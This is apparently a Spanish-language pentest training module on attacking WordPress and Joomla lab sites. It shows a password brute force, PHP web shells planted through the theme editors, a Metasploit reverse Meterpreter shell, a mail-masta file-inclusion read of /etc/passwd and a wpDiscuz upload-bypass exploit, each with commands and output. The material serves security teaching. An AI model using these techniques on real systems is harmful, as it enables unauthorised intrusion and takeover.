A partir de los datos que recopilamos manualmente y utilizando WPScan, ahora sabemos lo siguiente:

- El sitio está ejecutando la versión principal de WordPress 5.8, que sufre de algunas vulnerabilidades que no parecen interesantes en este momento
- El tema instalado es Transport Gravity
- Los siguientes plugins están en uso: Formulario de contacto 7, mail-masta, wpDiscuz
- La versión wpDiscuz es 7.0.4, que sufre de una vulnerabilidad de ejecución remota de código no autenticada
- La versión mail-masta es 1.0.0, que sufre de una vulnerabilidad de Inclusión de Archivo Local, así como inyección SQL
- El sitio de WordPress es vulnerable a la enumeración de usuarios y los usuarios `admin` y `john` se confirma que son usuarios válidos
- La lista de directorios está habilitada en todo el sitio, lo que puede conducir a la exposición de datos confidenciales
- XML-RPC está habilitado, que se puede aprovechar para realizar un ataque de fuerza bruta de contraseña contra la página de inicio de sesión utilizando WPScan [Metasploit](https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login), etc.

Con esta información anotada, pasemos a las cosas divertidas: ¡atacar a WordPress!


# Atacar WordPress

---

Hemos confirmado que el sitio web de la compañía se está ejecutando en WordPress y hemos enumerado la versión y los complementos instalados. Busquemos ahora rutas de ataque e intentemos obtener acceso a la red interna.

Hay varias maneras en que podemos abusar `built-in functionality` para atacar una instalación de WordPress. Cubriremos el inicio de sesión forzamiento bruto contra el `wp-login.php` ejecución remota de código y página a través del editor de temas. Estas dos tácticas se basan entre sí, ya que primero necesitamos obtener credenciales válidas para que un usuario de nivel de administrador inicie sesión en el back-end de WordPress y edite un tema.

---

## Iniciar sesión Bruteforce

WPScan se puede utilizar para forzar nombres de usuario y contraseñas. El informe de escaneo en la sección anterior devolvió a dos usuarios registrados en el sitio web (admin y john). La herramienta utiliza dos tipos de ataques de fuerza bruta de inicio de sesión, [xmlrpc](https://kinsta.com/blog/xmlrpc-php/) y wp-login. El `wp-login` el método intentará forzar brutamente la página de inicio de sesión estándar de WordPress, mientras que el `xmlrpc` method utiliza la API de WordPress para realizar intentos de inicio de sesión `/xmlrpc.php`. El `xmlrpc` se prefiere el método ya que es más rápido.

  Atacar WordPress

```shell-session
vcrdcr@htb[/htb]$ sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local

[+] URL: http://blog.inlanefreight.local/ [10.129.42.195]
[+] Started: Wed Aug 25 11:56:23 2021

<SNIP>

[+] Performing password attack on Xmlrpc against 1 user/s
[SUCCESS] - john / firebird1                                                                                           
Trying john / bettyboop Time: 00:00:13 <                                      > (660 / 14345052)  0.00%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: john, Password: firebird1

[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up

[+] Finished: Wed Aug 25 11:56:46 2021
[+] Requests Done: 799
[+] Cached Requests: 39
[+] Data Sent: 373.152 KB
[+] Data Received: 448.799 KB
[+] Memory used: 221 MB

[+] Elapsed time: 00:00:23
```

El `--password-attack` flag se utiliza para suministrar el tipo de ataque. El `-U` el argumento incluye una lista de usuarios o un archivo que contiene nombres de usuario. Esto se aplica a la `-P` opción de contraseñas también. El `-t` flag es el número de hilos que podemos ajustar hacia arriba o hacia abajo dependiendo. WPScan pudo encontrar credenciales válidas para un usuario `john:firebird1`.

---

## Ejecución de Código

Con acceso administrativo a WordPress, podemos modificar el código fuente de PHP para ejecutar comandos del sistema. Inicie sesión en WordPress con las credenciales para el `john` usuario, que nos redirigirá al panel de administración. Haga clic en `Appearance` en el panel lateral y seleccione Editor de temas. Esta página nos permitirá editar el código fuente de PHP directamente. Se puede seleccionar un tema inactivo para evitar corromper el tema principal. Ya sabemos que el tema activo es la Gravedad del Transporte. En su lugar, se puede elegir un tema alternativo como Twenty Nineteen.

Haga clic en `Select` después de seleccionar el tema, y podemos editar una página poco común como `404.php` para agregar un shell web.

Código: php

```php
system($_GET[0]);
```

El código anterior debería permitirnos ejecutar comandos a través del parámetro GET `0`. Añadimos esta única línea al archivo justo debajo de los comentarios para evitar demasiada modificación de los contenidos.

   

![](https://academy.hackthebox.com/storage/modules/113/theme_editor.png)

Haga clic en `Update File` en la parte inferior para ahorrar. Sabemos que los temas de WordPress se encuentran en `/wp-content/themes/<theme name>`. Podemos interactuar con el shell web a través del navegador o utilizando `cURL`. Como siempre, podemos utilizar este acceso para obtener un shell inverso interactivo y comenzar a explorar el objetivo.

  Atacar WordPress

```shell-session
vcrdcr@htb[/htb]$ curl http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=id

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

El [wp_admin_shell_subir](https://www.rapid7.com/db/modules/exploit/unix/webapp/wp_admin_shell_upload/) el módulo de Metasploit se puede usar para cargar un shell y ejecutarlo automáticamente.

El módulo carga un complemento malicioso y luego lo usa para ejecutar un shell PHP Meterpreter. Primero necesitamos establecer las opciones necesarias.

  Atacar WordPress

```shell-session
msf6 > use exploit/unix/webapp/wp_admin_shell_upload 

[*] No payload configured, defaulting to php/meterpreter/reverse_tcp

msf6 exploit(unix/webapp/wp_admin_shell_upload) > set rhosts blog.inlanefreight.local
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set username john
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set password firebird1
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set lhost 10.10.14.15 
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set rhost 10.129.42.195  
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set VHOST blog.inlanefreight.local
```

Entonces podemos emitir el `show options` comando para asegurarse de que todo está configurado correctamente. En este ejemplo de laboratorio, debemos especificar tanto el vhost como la dirección IP, o el exploit fallará con el error `Exploit aborted due to failure: not-found: The target does not appear to be using WordPress`.

  Atacar WordPress

```shell-session
msf6 exploit(unix/webapp/wp_admin_shell_upload) > show options 

Module options (exploit/unix/webapp/wp_admin_shell_upload):

   Name       Current Setting           Required  Description
   ----       ---------------           --------  -----------
   PASSWORD   firebird1                 yes       The WordPress password to authenticate with
   Proxies                              no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     10.129.42.195             yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      80                        yes       The target port (TCP)
   SSL        false                     no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                         yes       The base path to the wordpress application
   USERNAME   john                      yes       The WordPress username to authenticate with
   VHOST      blog.inlanefreight.local  no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.14.15      yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   WordPress
```

Una vez que estemos satisfechos con la configuración, podemos escribir `exploit` y obtener una shell inversa. A partir de aquí, podríamos comenzar a enumerar el host para datos confidenciales o rutas para la escalada de privilegios vertical/horizontal y el movimiento lateral.

  Atacar WordPress

```shell-session
msf6 exploit(unix/webapp/wp_admin_shell_upload) > exploit

[*] Started reverse TCP handler on 10.10.14.15:4444 
[*] Authenticating with WordPress using doug:jessica1...
[+] Authenticated with WordPress
[*] Preparing payload...
[*] Uploading payload...
[*] Executing the payload at /wp-content/plugins/CczIptSXlr/wCoUuUPfIO.php...
[*] Sending stage (39264 bytes) to 10.129.42.195
[*] Meterpreter session 1 opened (10.10.14.15:4444 -> 10.129.42.195:42816) at 2021-09-20 19:43:46 -0400
i[+] Deleted wCoUuUPfIO.php
[+] Deleted CczIptSXlr.php
[+] Deleted ../CczIptSXlr

meterpreter > getuid

Server username: www-data (33)
```

En el ejemplo anterior, el módulo Metasploit cargó el `wCoUuUPfIO.php` archivo a la `/wp-content/plugins` directorio. Muchos módulos Metasploit (y otras herramientas) intentan limpiarse después de sí mismos, pero algunos fallan. Durante una evaluación, nos gustaría hacer todo lo posible para limpiar este artefacto del sistema del cliente y, independientemente de si hemos sido capaces de eliminar o no, debemos enumerar este artefacto en nuestros apéndices de informe. Por lo menos, nuestro informe debe tener una sección de apéndice que enumere la siguiente información—más sobre esto en un módulo posterior.

- Sistemas explotados (nombre de host/IP y método de explotación)
- Usuarios comprometidos (nombre de cuenta, método de compromiso, tipo de cuenta (local o dominio))
- Artefactos creados en sistemas
- Cambios (como agregar un usuario administrador local o modificar la membresía del grupo)

---

## Aprovechamiento de Vulnerabilidades Conocidas

A lo largo de los años, el núcleo de WordPress ha sufrido su parte justa de vulnerabilidades, pero la gran mayoría de ellas se pueden encontrar en complementos. Según la página de Estadísticas de Vulnerabilidad de WordPress alojada [aquí](https://wpscan.com/statistics), en el momento de escribir este artículo, había 23,595 vulnerabilidades en la base de datos de WPScan. Estas vulnerabilidades se pueden desglosar de la siguiente manera:

- 4% núcleo de WordPress
- 89% plugins
- 7% temas

El número de vulnerabilidades relacionadas con WordPress ha crecido constantemente desde 2014, probablemente debido a la gran cantidad de temas y complementos gratuitos (y pagados) disponibles, y cada vez se agregan más cada semana. Por esta razón, debemos ser extremadamente minuciosos al enumerar un sitio de WordPress, ya que podemos encontrar complementos con vulnerabilidades recientemente descubiertas o incluso complementos antiguos, no utilizados/olvidados que ya no tienen un propósito en el sitio, pero aún se puede acceder.

Nota: Podemos usar el [waybackurls](https://github.com/tomnomnom/waybackurls) herramienta para buscar versiones anteriores de un sitio de destino utilizando la Wayback Machine. A veces podemos encontrar una versión anterior de un sitio de WordPress usando un plugin que tiene una vulnerabilidad conocida. Si el complemento ya no está en uso, pero los desarrolladores no lo eliminaron correctamente, es posible que podamos acceder al directorio en el que está almacenado y explotar una falla.

#### Plugins Vulnerables - mail-masta

Veamos algunos ejemplos. El plugin [mail-masta](https://wordpress.org/plugins/mail-masta/) ya no es compatible, pero ha tenido más de 2.300 [descargas](https://wordpress.org/plugins/mail-masta/advanced/) con los años. No está fuera del ámbito de la posibilidad de que podamos encontrarnos con este complemento durante una evaluación, probablemente instalado una vez y olvidado. Desde 2016 ha sufrido un [inyección SQL no autenticada](https://www.exploit-db.com/exploits/41438) y a [Inclusión Local de Archivos](https://www.exploit-db.com/exploits/50226).

Echemos un vistazo al código vulnerable para el plugin mail-masta.

Código: php

```php
<?php 

include($_GET['pl']);
global $wpdb;

$camp_id=$_POST['camp_id'];
$masta_reports = $wpdb->prefix . "masta_reports";
$count=$wpdb->get_results("SELECT count(*) co from  $masta_reports where camp_id=$camp_id and status=1");

echo $count[0]->co;

?>
```

Como podemos ver, el `pl` parámetro nos permite incluir un archivo sin ningún tipo de validación de entrada o desinfección. Usando esto, podemos incluir archivos arbitrarios en el servidor web. Explotemos esto para recuperar el contenido de la `/etc/passwd` archivo usando `cURL`.

  Atacar WordPress

```shell-session
vcrdcr@htb[/htb]$ curl -s http://blog.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
ubuntu:x:1000:1000:ubuntu:/home/ubuntu:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
mysql:x:113:119:MySQL Server,,,:/nonexistent:/bin/false
```

#### Plugins Vulnerables - wpDiscuz

[wpDiscuz](https://wpdiscuz.com/) es un complemento de WordPress para comentarios mejorados en publicaciones de página. En el momento de escribir, el plugin había terminado [1,6 millones de descargas](https://wordpress.org/plugins/wpdiscuz/advanced/) y más de 90,000 instalaciones activas, lo que lo convierte en un complemento extremadamente popular que tenemos una muy buena oportunidad de encontrar durante una evaluación. Basado en el número de versión (7.0.4), esto [explotar](https://www.exploit-db.com/exploits/49967) tiene una buena oportunidad de conseguir la ejecución de comandos. El quid de la vulnerabilidad es un bypass de carga de archivos. wpDiscuz está destinado solo a permitir archivos adjuntos de imágenes. Las funciones de tipo mime de archivo podrían omitirse, lo que permite a un atacante no autenticado cargar un archivo PHP malicioso y obtener la ejecución remota de código. Se puede encontrar más información sobre el bypass de las funciones de detección de tipo mimo [aquí](https://www.wordfence.com/blog/2020/07/critical-arbitrary-file-upload-vulnerability-patched-in-wpdiscuz-plugin/).

El script exploit toma dos parámetros: `-u` la URL y `-p` el camino a una publicación válida.

  Atacar WordPress

```shell-session
vcrdcr@htb[/htb]$ python3 wp_discuz.py -u http://blog.inlanefreight.local -p /?p=1

---------------------------------------------------------------
[-] Wordpress Plugin wpDiscuz 7.0.4 - Remote Code Execution
[-] File Upload Bypass Vulnerability - PHP Webshell Upload
[-] CVE: CVE-2020-24186
[-] https://github.com/hevox
--------------------------------------------------------------- 

[+] Response length:[102476] | code:[200]
[!] Got wmuSecurity value: 5c9398fcdb
[!] Got wmuSecurity value: 1 

[+] Generating random name for Webshell...
[!] Generated webshell name: uthsdkbywoxeebg

[!] Trying to Upload Webshell..
[+] Upload Success... Webshell path:url&quot;:&quot;http://blog.inlanefreight.local/wp-content/uploads/2021/08/uthsdkbywoxeebg-1629904090.8191.php&quot; 

> id

[x] Failed to execute PHP code...
```

El exploit como está escrito puede fallar, pero podemos usar `cURL` para ejecutar comandos utilizando el shell web cargado. Sólo necesitamos anexar `?cmd=` después del `.php` extensión para ejecutar comandos que podemos ver en el script exploit.

  Atacar WordPress

```shell-session
vcrdcr@htb[/htb]$ curl -s http://blog.inlanefreight.local/wp-content/uploads/2021/08/uthsdkbywoxeebg-1629904090.8191.php?cmd=id

GIF689a;

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

En este ejemplo, nos gustaría asegurarnos de limpiar el `uthsdkbywoxeebg-1629904090.8191.php` archive y una vez más enumerarlo como un artefacto de prueba en los apéndices de nuestro informe.

---

## Avanzando

Como hemos visto en las dos últimas secciones, WordPress presenta una vasta superficie de ataque. Durante nuestras carreras como probadores de penetración, casi definitivamente encontraremos WordPress muchas veces. Debemos tener las habilidades necesarias para implantar rápidamente una instalación de WordPress y realizar una enumeración manual y basada en herramientas para descubrir configuraciones erróneas y vulnerabilidades de alto riesgo. Si estas secciones en WordPress eran interesantes, echa un vistazo a la [Atacar el módulo de WordPress](https://academy.hackthebox.com/course/preview/hacking-wordpress) para más práctica.


# Joomla - Descubrimiento y enumeración

---

[Joomla](https://www.joomla.org/), lanzado en agosto de 2005 es otro CMS gratuito y de código abierto utilizado para foros de discusión, galerías de fotos, comercio electrónico, comunidades basadas en usuarios y más. Está escrito en PHP y utiliza MySQL en el backend. Al igual que WordPress, Joomla se puede mejorar con más de 7.000 extensiones y más de 1.000 plantillas. Hay hasta 2,5 millones de sitios en Internet que ejecutan Joomla. Aquí hay algunos interesantes [estadísticas](https://websitebuilder.org/blog/joomla-statistics/) acerca de Joomla:

- Joomla representa el 3,5% de la cuota de mercado de CMS
- Joomla es 100% libre y significa "todos juntos" en swahili (ortografía fonética de "Jumla")
- La comunidad de Joomla tiene cerca de 700,000 en sus foros en línea
- Joomla impulsa el 3% de todos los sitios web en Internet, casi 25,000 de los 1 millón de sitios más importantes del mundo (solo el 10% del alcance de WordPress)
- Algunas organizaciones notables que usan Joomla incluyen eBay, Yamaha, la Universidad de Harvard y el gobierno del Reino Unido
- Con los años, 770 desarrolladores diferentes han contribuido a Joomla

Joomla recoge algunos anónimos [estadísticas de uso](https://developer.joomla.org/about/stats.html) como el desglose de Joomla, PHP y versiones de bases de datos y sistemas operativos de servidor en uso en instalaciones de Joomla. Estos datos se pueden consultar a través de su público [API](https://developer.joomla.org/about/stats/api.html).

Consultando esta API, ¡podemos ver más de 2.7 millones de instalaciones de Joomla!

  Joomla - Descubrimiento y enumeración

```shell-session
vcrdcr@htb[/htb]$ curl -s https://developer.joomla.org/stats/cms_version | python3 -m json.tool

{
    "data": {
        "cms_version": {
            "3.0": 0,
            "3.1": 0,
            "3.10": 3.49,
            "3.2": 0.01,
            "3.3": 0.02,
            "3.4": 0.05,
            "3.5": 13,
            "3.6": 24.29,
            "3.7": 8.5,
            "3.8": 18.84,
            "3.9": 30.28,
            "4.0": 1.52,
            "4.1": 0
        },
        "total": 2776276
    }
}
```

---

## Descubrimiento/Footprinting

Supongamos que nos encontramos con un sitio de comercio electrónico durante una prueba de penetración externa. A primera vista, no estamos exactamente seguros de lo que se está ejecutando, pero no parece ser totalmente personalizado. Si podemos tomar las huellas dactilares de en qué se está ejecutando el sitio, es posible que podamos descubrir vulnerabilidades o configuraciones erróneas. Basándonos en la información limitada, asumimos que el sitio está ejecutando Joomla, pero debemos confirmar ese hecho y luego averiguar el número de versión y otra información, como temas y complementos instalados.

A menudo podemos tomar las huellas digitales de Joomla mirando la fuente de la página, que nos dice que estamos tratando con un sitio de Joomla.

  Joomla - Descubrimiento y enumeración

```shell-session
vcrdcr@htb[/htb]$ curl -s http://dev.inlanefreight.local/ | grep Joomla

	<meta name="generator" content="Joomla! - Open Source Content Management" />


<SNIP>
```

El `robots.txt` el archivo de un sitio de Joomla a menudo se verá así:

  Joomla - Descubrimiento y enumeración

```shell-session
# If the Joomla site is installed within a folder
# eg www.example.com/joomla/ then the robots.txt file
# MUST be moved to the site root
# eg www.example.com/robots.txt
# AND the joomla folder name MUST be prefixed to all of the
# paths.
# eg the Disallow rule for the /administrator/ folder MUST
# be changed to read
# Disallow: /joomla/administrator/
#
# For more information about the robots.txt standard, see:
# https://www.robotstxt.org/orig.html

User-agent: *
Disallow: /administrator/
Disallow: /bin/
Disallow: /cache/
Disallow: /cli/
Disallow: /components/
Disallow: /includes/
Disallow: /installation/
Disallow: /language/
Disallow: /layouts/
Disallow: /libraries/
Disallow: /logs/
Disallow: /modules/
Disallow: /plugins/
Disallow: /tmp/
```

También podemos ver a menudo el cuento Joomla favicon (pero no siempre). Podemos tomar las huellas dactilares de la versión de Joomla si el `README.txt` el archivo está presente.

  Joomla - Descubrimiento y enumeración

```shell-session
vcrdcr@htb[/htb]$ curl -s http://dev.inlanefreight.local/README.txt | head -n 5

1- What is this?
	* This is a Joomla! installation/upgrade package to version 3.x
	* Joomla! Official site: https://www.joomla.org
	* Joomla! 3.9 version history - https://docs.joomla.org/Special:MyLanguage/Joomla_3.9_version_history
	* Detailed changes in the Changelog: https://github.com/joomla/joomla-cms/commits/staging
```

En ciertas instalaciones de Joomla, es posible que podamos tomar las huellas dactilares de la versión de los archivos JavaScript en el `media/system/js/` directorio o navegando a `administrator/manifests/files/joomla.xml`.

  Joomla - Descubrimiento y enumeración

```shell-session
vcrdcr@htb[/htb]$ curl -s http://dev.inlanefreight.local/administrator/manifests/files/joomla.xml | xmllint --format -

<?xml version="1.0" encoding="UTF-8"?>
<extension version="3.6" type="file" method="upgrade">
  <name>files_joomla</name>
  <author>Joomla! Project</author>
  <authorEmail>admin@joomla.org</authorEmail>
  <authorUrl>www.joomla.org</authorUrl>
  <copyright>(C) 2005 - 2019 Open Source Matters. All rights reserved</copyright>
  <license>GNU General Public License version 2 or later; see LICENSE.txt</license>
  <version>3.9.4</version>
  <creationDate>March 2019</creationDate>
  
 <SNIP>
```

El `cache.xml` el archivo puede ayudarnos a darnos la versión aproximada. Se encuentra en `plugins/system/cache/cache.xml`.

---

## Enumeración

Probemos [droopescan](https://github.com/droope/droopescan), un escáner basado en plugins que funciona para SilverStripe, WordPress y Drupal con funcionalidad limitada para Joomla y Moodle.

Podemos clonar el repositorio de Git e instalarlo manualmente o instalarlo a través de `pip`.

  Joomla - Descubrimiento y enumeración

```shell-session
vcrdcr@htb[/htb]$ sudo pip3 install droopescan

Collecting droopescan
  Downloading droopescan-1.45.1-py2.py3-none-any.whl (514 kB)
     |████████████████████████████████| 514 kB 5.8 MB/s
	 
<SNIP>
```

Una vez finalizada la instalación, podemos confirmar que la herramienta está funcionando ejecutándose `droopescan -h`.

  Joomla - Descubrimiento y enumeración

```shell-session
vcrdcr@htb[/htb]$ droopescan -h

usage: droopescan (sub-commands ...) [options ...] {arguments ...}

    |
 ___| ___  ___  ___  ___  ___  ___  ___  ___  ___
|   )|   )|   )|   )|   )|___)|___ |    |   )|   )
|__/ |    |__/ |__/ |__/ |__   __/ |__  |__/||  /
                    |
=================================================

commands:

  scan
    cms scanning functionality.

  stats
    shows scanner status & capabilities.

optional arguments:
  -h, --help  show this help message and exit
  --debug     toggle debug output
  --quiet     suppress all output

Example invocations: 
  droopescan scan drupal -u URL_HERE
  droopescan scan silverstripe -u URL_HERE

More info: 
  droopescan scan --help
 
Please see the README file for information regarding proxies.
```

Podemos acceder a un menú de ayuda más detallado escribiendo `droopescan scan --help`.

Hagamos un escaneo y veamos qué aparece.

  Joomla - Descubrimiento y enumeración

```shell-session
vcrdcr@htb[/htb]$ droopescan scan joomla --url http://dev.inlanefreight.local/

[+] Possible version(s):                                                        
    3.8.10
    3.8.11
    3.8.11-rc
    3.8.12
    3.8.12-rc
    3.8.13
    3.8.7
    3.8.7-rc
    3.8.8
    3.8.8-rc
    3.8.9
    3.8.9-rc

[+] Possible interesting urls found:
    Detailed version information. - http://dev.inlanefreight.local/administrator/manifests/files/joomla.xml
    Login page. - http://dev.inlanefreight.local/administrator/
    License file. - http://dev.inlanefreight.local/LICENSE.txt
    Version attribute contains approx version - http://dev.inlanefreight.local/plugins/system/cache/cache.xml

[+] Scan finished (0:00:01.523369 elapsed)
```

Como podemos ver, no apareció mucha información aparte del posible número de versión. También podemos probar [JoomlaScan](https://github.com/drego85/JoomlaScan), que es una herramienta de Python inspirada en el ahora desaparecido OWASP [joomscan](https://github.com/OWASP/joomscan) herramienta. `JoomlaScan` está un poco desactualizado y requiere que se ejecute Python2.7. Podemos ponerlo en funcionamiento asegurándonos primero de que se instalen algunas dependencias.

  Joomla - Descubrimiento y enumeración

```shell-session
vcrdcr@htb[/htb]$ sudo python2.7 -m pip install urllib3
vcrdcr@htb[/htb]$ sudo python2.7 -m pip install certifi
vcrdcr@htb[/htb]$ sudo python2.7 -m pip install bs4
```

Aunque un poco desactualizado, puede ser útil en nuestra enumeración. Hagamos un escaneo.

  Joomla - Descubrimiento y enumeración

```shell-session
vcrdcr@htb[/htb]$ python2.7 joomlascan.py -u http://dev.inlanefreight.local

-------------------------------------------
      	     Joomla Scan                  
   Usage: python joomlascan.py <target>    
    Version 0.5beta - Database Entries 1233
         created by Andrea Draghetti       
-------------------------------------------
Robots file found: 	 	 > http://dev.inlanefreight.local/robots.txt
No Error Log found

Start scan...with 10 concurrent threads!
Component found: com_actionlogs	 > http://dev.inlanefreight.local/index.php?option=com_actionlogs
	 On the administrator components
Component found: com_admin	 > http://dev.inlanefreight.local/index.php?option=com_admin
	 On the administrator components
Component found: com_ajax	 > http://dev.inlanefreight.local/index.php?option=com_ajax
	 But possibly it is not active or protected
	 LICENSE file found 	 > http://dev.inlanefreight.local/administrator/components/com_actionlogs/actionlogs.xml
	 LICENSE file found 	 > http://dev.inlanefreight.local/administrator/components/com_admin/admin.xml
	 LICENSE file found 	 > http://dev.inlanefreight.local/administrator/components/com_ajax/ajax.xml
	 Explorable Directory 	 > http://dev.inlanefreight.local/components/com_actionlogs/
	 Explorable Directory 	 > http://dev.inlanefreight.local/administrator/components/com_actionlogs/
	 Explorable Directory 	 > http://dev.inlanefreight.local/components/com_admin/
	 Explorable Directory 	 > http://dev.inlanefreight.local/administrator/components/com_admin/
Component found: com_banners	 > http://dev.inlanefreight.local/index.php?option=com_banners
	 But possibly it is not active or protected
	 Explorable Directory 	 > http://dev.inlanefreight.local/components/com_ajax/
	 Explorable Directory 	 > http://dev.inlanefreight.local/administrator/components/com_ajax/
	 LICENSE file found 	 > http://dev.inlanefreight.local/administrator/components/com_banners/banners.xml


<SNIP>
```

Si bien no es tan valiosa como droopescan, esta herramienta puede ayudarnos a encontrar directorios y archivos accesibles y puede ayudar con las extensiones instaladas de huellas dactilares. En este punto, sabemos que estamos tratando con Joomla `3.9.4`. El portal de inicio de sesión del administrador se encuentra en `http://dev.inlanefreight.local/administrator/index.php`. Los intentos de enumeración del usuario devuelven un mensaje de error genérico.

  Joomla - Descubrimiento y enumeración

```shell-session
Warning
Username and password do not match or you do not have an account yet.
```

La cuenta de administrador predeterminada en las instalaciones de Joomla es `admin`, pero la contraseña se establece en el momento de la instalación, por lo que la única forma en que podemos esperar entrar en el back-end del administrador es si la cuenta está configurada con una contraseña muy débil/común y podemos entrar con algunas conjeturas o fuerza bruta ligera. Podemos usar esto [guión](https://github.com/ajnik/joomla-bruteforce) para intentar forzar brutamente el inicio de sesión.

  Joomla - Descubrimiento y enumeración

```shell-session
vcrdcr@htb[/htb]$ sudo python3 joomla-brute.py -u http://dev.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin
 
admin:admin
```

Y recibimos un golpe con las credenciales `admin:admin`. ¡Alguien no ha estado siguiendo las mejores prácticas!


# Atacando a Joomla

---

Ahora sabemos que estamos tratando con un sitio de comercio electrónico de Joomla. Si podemos obtener acceso, podemos aterrizar en el entorno interno del cliente y comenzar a enumerar el entorno de dominio interno. Al igual que WordPress y Drupal, Joomla ha tenido su parte justa de vulnerabilidades contra la aplicación principal y las extensiones vulnerables. Además, como los demás, es posible obtener la ejecución remota de código si podemos iniciar sesión en el backend del administrador.

---

## Abusar de la Funcionalidad Incorporada

Durante la fase de enumeración de Joomla y la búsqueda de investigación general de datos de la compañía, podemos encontrar credenciales filtradas que podemos usar para nuestros propósitos. Usando las credenciales que obtuvimos en los ejemplos de la última sección, `admin:admin`iniciemos sesión en el backend de destino en `http://dev.inlanefreight.local/administrator`. Una vez que haya iniciado sesión, podemos ver muchas opciones disponibles para nosotros. Para nuestros propósitos, nos gustaría agregar un fragmento de código PHP para obtener RCE. Podemos hacer esto personalizando una plantilla.

Si recibe un error que indica "Se ha producido un error. Llame a una función miembro format() en null" después de iniciar sesión, navegue a "http://dev.inlanefreight.local/administrator/index.php?option=com_plugins" y deshabilite el complemento "Quick Icon - PHP Version Check". Esto permitirá que el panel de control se muestre correctamente.

   

![](https://academy.hackthebox.com/storage/modules/113/joomla_admin.png)

Desde aquí, podemos hacer clic en `Templates` en la parte inferior izquierda debajo `Configuration` para abrir el menú de plantillas.

   

![](https://academy.hackthebox.com/storage/modules/113/joomla_templates.png)

A continuación, podemos hacer clic en un nombre de plantilla. Elegamos `protostar` bajo el `Template` encabezado de columna. Esto nos llevará al `Templates: Customise` página.

   

![](https://academy.hackthebox.com/storage/modules/113/joomla_customise.png)

Finalmente, podemos hacer clic en una página para extraer la fuente de la página. Es una buena idea acostumbrarse a usar nombres y parámetros de archivos no estándar para nuestros shells web para no hacerlos fácilmente accesibles a un atacante "conducción" durante la evaluación. También podemos proteger con contraseña e incluso limitar el acceso a nuestra dirección IP de origen. Además, siempre debemos recordar limpiar los shells web tan pronto como hayamos terminado con ellos, pero aún así incluir el nombre del archivo, el hash del archivo y la ubicación en nuestro informe final al cliente.

Elegamos el `error.php` página. Agregaremos una línea única de PHP para obtener la ejecución de código de la siguiente manera.

Código: php

```php
system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
```

   

![](https://academy.hackthebox.com/storage/modules/113/joomla_edited.png)

Una vez que esto esté adentro, haga clic en `Save & Close` en la parte superior y confirmar la ejecución de código usando `cURL`.

  Atacando a Joomla

```shell-session
vcrdcr@htb[/htb]$ curl -s http://dev.inlanefreight.local/templates/protostar/error.php?dcfdd5e021a869fcc6dfaef8bf31377e=id

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Desde aquí, podemos actualizar a un shell inverso interactivo y comenzar a buscar vectores de escalada de privilegios locales o centrarnos en el movimiento lateral dentro de la red corporativa. Deberíamos estar seguros, una vez más, de anotar este cambio para nuestros apéndices de informes y hacer todo lo posible para eliminar el fragmento de PHP del `error.php` página.

---

## Aprovechamiento de Vulnerabilidades Conocidas

